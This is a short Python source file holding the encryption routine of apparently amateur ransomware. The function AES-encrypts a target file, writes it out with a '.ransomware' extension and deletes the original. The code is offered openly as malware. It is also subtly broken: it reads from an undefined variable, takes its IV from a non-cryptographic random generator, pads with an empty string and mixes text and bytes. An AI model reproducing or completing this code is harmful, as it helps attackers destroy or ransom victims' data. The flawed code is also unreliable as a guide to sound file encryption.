import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

def encrypt(key, filepath):
	chunk_size = 65536
	direx, ext = os.path.splitext(filepath)
	ext += ' ' * (16 - (len(ext) % 16))
	filesize = str(os.path.getsize(filepath)).zfill(16)
	
	out_file = '%s.ransomware' % direx
	
	IV = ''.join([chr(randint(0,255)) for i in range(16)])
	encryptor = AES.new(key, AES.MODE_CBC, IV)
	
	with open(filepath, 'rb') as in_file:
		with open(out_file, 'wb') as outfile:
			outfile.write(ext)
			outfile.write(filesize)
			outfile.write(IV)
			
			while True:
				chunk = infile.read(chunk_size)
				if len(chunk) == 0:
					break
				elif len(chunk) % 16 != 0:
					chunk += '' * (16 - (len(chunk)) % 16)
					
				outfile.write(encryptor.encrypt(chunk))
	
	os.unlink(filepath)
	
	return
